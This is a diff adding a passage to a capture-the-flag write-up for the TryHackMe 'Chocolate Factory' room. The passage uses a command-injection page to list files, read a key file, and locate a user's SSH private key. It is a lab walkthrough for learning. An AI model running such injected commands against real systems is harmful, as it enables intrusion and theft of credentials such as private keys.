@@ -48,5 +48,42 @@ Index.html is a login page, let’s see the source code.
 
 ![src_code](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/source_code.png)
 
+**Validate.php:**
+
+<script>alert('Incorrect Credentials');</script><script>window.location='index.html'</script>
+Validate
+
+
+Now to the interesting part: **home.php**
+
+![homephp](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/homephp.png)
+
+There is a command injection page in here. Let’s try a few
+
+` ls: `
+ home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php
+
+So there is a key in this directory. Let’s see what it has.
+` cat key_rev_key `
+
+copy it and echo to terminal to see it better
+
+Enter your name: %slaksdhfas congratulations you have found the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' Keep its safeBad name!
+
+See other directories aswell.
+` pwd: `
+
+ /var/www/html
+
+` ls /home `
+
+user named charlie
+
+` ls /home/charlie `
+
+ teleport teleport.pub user.txt
+
+user.txt is not readable
+teleport.pub is the ssh public key and teleport is the private key
 
 ##### author: Dániel Varkoly
